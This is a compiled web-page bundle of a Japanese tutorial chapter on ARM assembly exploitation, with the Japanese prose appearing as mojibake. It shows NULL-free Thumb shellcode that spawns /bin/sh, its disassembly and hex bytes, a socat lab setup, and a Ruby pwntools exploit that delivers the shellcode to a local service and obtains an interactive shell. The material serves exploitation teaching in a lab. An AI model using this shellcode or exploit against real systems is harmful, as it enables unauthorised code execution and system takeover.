ãƒ¬ã‚¸ã‚¹ã‚¿ã¯ã€1ã¤å‰ã®å‘½ä»¤ã§0åˆæœŸåŒ–ã—ã¦ã„ã‚‹ãŸã‚ã€æœ¬å‡¦ç†ã¯ã€"),s("code",[t._v("A")]),t._v(" ã‚’"),s("code",[t._v("\\x00")]),t._v(" ã«ç½®ãæ›ãˆã‚‹å‡¦ç†ã«ãªã£ã¦ã„ã¾ã™ã€‚ç”Ÿã®å€¤ã¨ã—ã¦"),s("code",[t._v("\\x00")]),t._v(" ã‚’åŸ‹ã‚è¾¼ã‚€ã®ã§ã¯ãªãã€ã‚³ãƒ¼ãƒ‰ã®å®Ÿè¡Œä¸­ã«"),s("code",[t._v("\\x00")]),t._v(" ã«ç½®ãæ›ãˆã‚‹ã“ã¨ã§NULLãŒç„¡ã„ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿç¾ã—ã¦ã„ã¾ã™ã€‚Exploitã«åˆ©ç”¨ã™ã‚‹éš›ã«ã¯NULLãŒå­˜åœ¨ã—ãªã„ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒæœ›ã¾ã—ã„ã§ã™ã€‚ã§ã¯ã€å®Ÿéš›ã«ã‚¢ã‚»ãƒ³ãƒ–ãƒ«ã—ã¦å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã€ä¸­èº«ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ as shellcode.asm -o shellcode.o\n$ ld shellcode.o -o shellcode.bin\n$ objdump -d shellcode.bin\n\nshellcode.bin:     "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("file")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("format")]),t._v(" elf32-littlearm\n\n\nDisassembly of section .text:\n\n00010054 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("_start"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10054")]),t._v(":       e28f3001        "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v("     r3, pc, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#1")]),t._v("\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10058")]),t._v(":       e12fff13        bx      r3\n   1005c:       a002            "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("add")]),t._v("     r0, pc, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#8      ; (adr r0, 10068 <s>)")]),t._v("\n   1005e:       270b            movs    r7, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#11")]),t._v("\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10060")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4049")]),t._v("            eors    r1, r1\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10062")]),t._v(":       "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("4052")]),t._v("            eors    r2, r2\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10064")]),t._v(":       71c2            strb    r2, "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("r0, "),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#7]")]),t._v("\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10066")]),t._v(":       df01            svc     "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),t._v("\n\n00010068 "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("s"),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(":\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10068")]),t._v(":       6e69622f        .word   0x6e69622f\n   1006c:       4168732f        .word   0x4168732f\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10070")]),t._v(":       00              .byte   0x00\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10071")]),t._v(":       00              .byte   0x00\n   "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("10072")]),t._v(":       46c0            nop                     "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("mov r8, r8"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[t._v("ä¸Šè¨˜ã®é€šã‚Šã€0x1006c ã¾ã§ã®å‘½ä»¤ã®16é€²æ•°ã«"),s("code",[t._v("00")]),t._v("ãŒå«ã¾ã‚Œã¦ã„ãªã„ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"tip custom-block"},[s("p",[s("code",[t._v("shellcode.bin")]),t._v(" ã¯å®Ÿè¡Œã§ãã‚‹ã®ã§ã™ãŒã€æ­£ã—ãå®Ÿè¡Œã•ã‚Œãšã«çµ‚äº†ã—ã¦ã—ã¾ã„ã¾ã™ã€‚ãã‚Œã¯ã€"),s("code",[t._v("A")]),t._v("ã‚’"),s("code",[t._v("\\x00")]),t._v("ã§ç½®ãæ›ãˆã‚‹å‡¦ç†ã«ãŠã„ã¦ã€æ›¸ãè¾¼ã¿æ¨©é™ãŒãªã„ãŸã‚ã§ã™ã€‚ã—ã‹ã—ãªãŒã‚‰ã€Exploitã«çµ„ã¿è¾¼ã¿å®Ÿè¡Œã™ã‚‹éš›ã¯ã€ã»ã¨ã‚“ã©ã®å ´åˆã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰è‡ªä½“ãŒå­˜åœ¨ã™ã‚‹ãƒ¡ãƒ¢ãƒªã®æ›¸ãè¾¼ã¿æ¨©é™ã¯ã‚ã‚‹ãŸã‚æ­£å¸¸ã«å‹•ä½œã—ã¾ã™ã€‚")])]),t._v(" "),s("h2",{attrs:{id:"_1-3-ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ç”¨ã„ãŸã‚·ã‚§ãƒ«å¥ªå–"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-3-ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ç”¨ã„ãŸã‚·ã‚§ãƒ«å¥ªå–","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.3 ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ç”¨ã„ãŸã‚·ã‚§ãƒ«å¥ªå–")]),t._v(" "),s("p",[t._v("ã“ã“ã§ã¯ä»–ã®ç« ã§ã‚‚ä½¿ã£ã¦ã„ãæ¼”ç¿’å•é¡Œã‚’ç”¨ã„ãŸæ”»æ’ƒç’°å¢ƒã®æ§‹ç¯‰æ–¹æ³•ã«ã¤ã„ã¦ã”ç´¹ä»‹ã—ã¾ã™ã€‚ã“ã“ã§ã¯ã€Raspbianå´ã§socatã‚’ç”¨ã„ã¦ãƒã‚¤ãƒŠãƒªãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç‰¹å®šã®ãƒãƒ¼ãƒˆã§å¾…ã¡å—ã‘ã¦ã€ãã“ã¸å‘ã‘ã¦æ”»æ’ƒã—ã¦ã„ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã“ã§ã¯ã€"),s("code",[t._v("shellcode")]),t._v("ã¨ã„ã†å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‚’8888/tcp ã§å¾…å—ã•ã›ã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯å…¥åŠ›ã‚’å—ã‘å–ã‚Šã€ãã‚Œã‚’å®Ÿè¡Œã™ã‚‹ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã«ãªã£ã¦ã„ã¾ã™ã€‚é€ã£ãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ãŒãã®ã¾ã¾å®Ÿè¡Œã•ã‚Œã¦ã—ã¾ã†ã¨ã¦ã‚‚å±é™ºãªãƒ—ãƒ­ã‚°ãƒ©ãƒ ã§ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ socat tcp-l:8888,reuseaddr,fork exec:./shellcode\n")])])]),s("p",[t._v("ä¸Šè¨˜ã‚’å®Ÿè¡Œå¾Œã€ãƒ›ã‚¹ãƒˆç’°å¢ƒã‹ã‚‰æ¥ç¶šã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ãªå¿œç­”ãŒå¸°ã£ã¦ãã‚‹ã¯ãšã§ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ "),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("nc")]),t._v(" localhost "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8888")]),t._v("\nGive me a shellcode: \n")])])]),s("p",[t._v("ã“ã‚Œã§æ”»æ’ƒç’°å¢ƒã®æ§‹ç¯‰ã¯çµ‚äº†ã§ã™ã€‚æ¬¡ã«ã€å®Ÿéš›ã®Exploit ã‚³ãƒ¼ãƒ‰ã‚’ä½œæˆã—ã¦ã„ãã¾ã™ãŒã€ãã®å‰ã« "),s("a",{attrs:{href:"#%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%B3%E3%83%BC%E3%83%89%E4%BD%9C%E6%88%90"}},[t._v("1.2 ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ä½œæˆ")]),t._v(" ã§ä½œæˆã—ãŸã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’ã‚¹ã‚¯ãƒªãƒ—ãƒˆè¨€èªãªã©ã§æ‰±ãˆã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã¨ã—ã¦æŠ½å‡ºã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã®ã¯ã€ã‚¢ã‚»ãƒ³ãƒ–ãƒªè¨€èªã§ä½œæˆã—ãŸéƒ¨åˆ†ã®ã¿ãªã®ã§ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã—ã¦å–ã‚Šå‡ºã—ã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ objcopy -O binary shellcode.bin shellcode_hex.bin\n$ hexdump -v -e "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'\""),s("span",{pre:!0,attrs:{class:"token entity",title:"\\\\"}},[t._v("\\\\")]),t._v('""x" 1/1 "%02x" ""\'')]),t._v(" shellcode_hex.bin\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x01"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x30"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x8f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xe2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x13"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xff"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x2f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xe1"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x02"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xa0"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x0b"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x27"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x49"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x40"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x52"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x40"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xc2"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x71"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x01"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("xdf"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x2f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x62"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x69"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x6e"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x2f"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x73"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x68"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("\\")]),t._v("x41\n")])])]),s("p",[t._v("8888/tcp ã¨æ¥ç¶šã—ã¦ã€ã“ã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’é€ã‚‹Exploit ã‚³ãƒ¼ãƒ‰ã‚’ä»¥ä¸‹ã«ç¤ºã—ã¾ã™ã€‚")]),t._v(" "),s("div",{staticClass:"language-ruby extra-class"},[s("pre",{pre:!0,attrs:{class:"language-ruby"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#!/usr/bin/env ruby")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#coding: ascii-8bit")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("require")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'pwn'")]),t._v("\n\nhost "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v("'localhost'")]),t._v("\nport "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("8888")]),t._v("\nz "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token constant"}},[t._v("Sock")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("new")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token class-name"}},[t._v("host")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" port\nz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvuntil "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('": "')]),t._v("\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\xa0\\x0b\\x27\\x49\\x40\\x52\\x40\\xc2\\x71\\x01\\xdf\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41"')]),t._v("\nputs "),s("span",{pre:!0,attrs:{class:"token string"}},[t._v('"[*] shellcode length: '),s("span",{pre:!0,attrs:{class:"token interpolation"}},[s("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("#{")]),t._v("payload"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),s("span",{pre:!0,attrs:{class:"token delimiter tag"}},[t._v("}")])]),t._v('"')]),t._v("\nz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline payload\nz"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interact\n")])])]),s("p",[t._v("æœ¬ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ä»¥ä¸‹ã®ã‚ˆã†ã«ã€Raspbian å†…éƒ¨ã®ã‚·ã‚§ãƒ«ã‚’æ“ä½œã§ãã‚‹ã‚ˆã†ã«ãªã£ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã¾ãŸã€ã“ã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®é•·ã•ã¯ã€28byteã§ã—ãŸã€‚")]),t._v(" "),s("div",{staticClass:"language-bash extra-class"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[t._v("$ ./solve.rb\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" shellcode length: "),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("28")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("INFO"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v(" Switching to interactive mode\n"),s("span",{pre:!0,attrs:{class:"token function"}},[t._v("id")]),t._v("\n"),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("uid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("gid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[t._v("groups")]),s("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[t._v("1000")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("pi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",4"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("adm"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",20"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("dialout"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",24"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cdrom"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",27"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sudo"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",29"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("audio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",44"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("video"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",46"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("plugdev"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",60"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("games"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",100"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("users"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",105"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("input"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",109"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("netdev"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",997"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("gpio"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",998"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("i2c"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(",999"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("spi"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])]),s("p",[t._v("ç¶šãç« ã§ã‚‚åŒã˜ã‚ˆã†ãªæ‰‹é †ã§ã€ãƒã‚¤ãƒŠãƒªã‚’å¾…ã¡å—ã‘ã¦ã€Exploit ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã„ãã¾ã™ã€‚")]),t._v(" "),s("h2",{attrs:{id:"_1-4-ã¾ã¨ã‚"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_1-4-ã¾ã¨ã‚","aria-hidden":"true"}},[t._v("#")]),t._v(" 1.4 ã¾ã¨ã‚")]),t._v(" "),s("p",[t._v("æœ¬ç« ã§ã¯ã€ARMã‚¢ã‚»ãƒ³ãƒ–ãƒªã®åŸºæœ¬ã‹ã‚‰ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®ä½œæˆã¨å®Ÿè¡Œã¾ã§å¹…åºƒãè¦‹ã¦ãã¾ã—ãŸã€‚ARMã‚¢ã‚»ãƒ³ãƒ–ãƒªã¯ã€x86ã¨é•ã†ç‚¹ãŒå¤šãå°‘ã—ã‚€ãšã‹ã—ã„ã§ã™ãŒã€Exploit ã‚’ã™ã‚‹ä¸Šã§ã¯Thumbãƒ¢ãƒ¼ãƒ‰ãªã©é‡è¦ãªè¦ç´ ãŒã¨ã¦ã‚‚å¤šãçµ¡ã‚“ã§ãã¾ã™ã€‚é©åˆ‡ã«ç†è§£ã™ã‚‹ã“ã¨ã§ã€ä»–ã®æ”»æ’ƒæ‰‹æ³•ã‚’æ­£ã—ãç†è§£ã§ãã‚‹ã‚ˆã†ã«ãªã‚‹ã¨æ€ã„ã¾ã™ã€‚")])])}),[],!1,null,null,null);a.default=n.exports}}]);